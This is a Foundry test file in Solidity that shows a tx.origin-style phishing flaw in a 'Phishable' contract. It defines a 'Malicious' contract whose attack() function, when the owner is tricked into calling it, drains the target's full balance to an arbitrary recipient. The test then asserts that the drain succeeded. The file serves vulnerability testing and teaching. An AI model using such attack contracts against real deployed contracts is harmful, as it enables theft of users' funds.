
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract Malicious {
    Phishable public target;
    address payable public recipient;

    constructor(Phishable _target, address payable _recipient) {
        target = _target;
        recipient = _recipient;
    }

    function attack() public {
        target.withdrawAll(recipient);
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public _contractUnderTest;

    function setUp() public {
        address owner = vm.addr(1);
        _contractUnderTest = new Phishable(owner);
    }

    function test_highlightArbitraryUserCanAccess(address caller, address recipient, uint256 amount) public {
        
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        vm.assume(caller != _contractUnderTest.owner());
        vm.assume(recipient != address(0));
        vm.assume(amount > 0);

        // --- 2. State Configuration ---
        
        vm.deal(address(_contractUnderTest), amount);

        // --- 3. Execution & Assertion ---
        
        vm.prank(caller);
        Malicious malicious = new Malicious(_contractUnderTest, payable(recipient));

        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        uint256 recipientBalanceBefore = recipient.balance;

        vm.prank(_contractUnderTest.owner());
        malicious.attack();

        uint256 contractBalanceAfter = address(_contractUnderTest).balance;
        uint256 recipientBalanceAfter = recipient.balance;

        assertEq(contractBalanceAfter, 0);
        assertEq(recipientBalanceAfter, recipientBalanceBefore + contractBalanceBefore);
    }
}
